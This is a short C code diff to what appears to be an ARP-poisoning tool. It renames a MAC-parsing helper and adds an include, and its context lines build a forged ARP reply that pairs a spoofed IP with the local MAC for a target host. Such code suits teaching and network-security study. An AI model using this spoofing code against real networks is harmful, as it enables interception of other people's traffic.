@@ -6,12 +6,14 @@
 */
 
 #include <stdio.h>
+#include <string.h>
 #include <arpa/inet.h>
 #include <netinet/ether.h>
 #include "poisoning.h"
 #include "inquisitor.h"
 
-static int get_hex_from_mac_addr(unsigned char *dest, const char *addr_str) {
+/* local copy, renamed to avoid clashing with poisoning.h's declaration */
+static int mac_to_bytes(unsigned char *dest, const char *addr_str) {
 	for (int i = 0; i < 6; i++) {
 		if (sscanf(addr_str, "%hhx", &dest[i]) != 1) return 1;
 		addr_str += 3;
@@ -38,8 +40,8 @@ int main(int ac, char **av) {
 	t_arp_frame frame;
 	memset(&frame, 0, sizeof(frame));
 
-	get_hex_from_mac_addr(frame.eth.dst_mac,  config.target_mac);
-	get_hex_from_mac_addr(frame.eth.src_mac,  config.local_mac);
+	mac_to_bytes(frame.eth.dst_mac,  config.target_mac);
+	mac_to_bytes(frame.eth.src_mac,  config.local_mac);
 	frame.eth.ether_type = htons(0x0806);
 
 	frame.arp.hardware_type    = htons(1);
@@ -48,9 +50,9 @@ int main(int ac, char **av) {
 	frame.arp.protocol_addr_len = 4;
 	frame.arp.opcode           = htons(2);
 
-	get_hex_from_mac_addr(frame.arp.sender_mac, config.local_mac);
+	mac_to_bytes(frame.arp.sender_mac, config.local_mac);
 	inet_pton(AF_INET, config.spoof_ip,   frame.arp.sender_ip);
-	get_hex_from_mac_addr(frame.arp.target_mac, config.target_mac);
+	mac_to_bytes(frame.arp.target_mac, config.target_mac);
 	inet_pton(AF_INET, config.target_ip, frame.arp.target_ip);
 
 	unsigned char *raw = (unsigned char *)&frame;
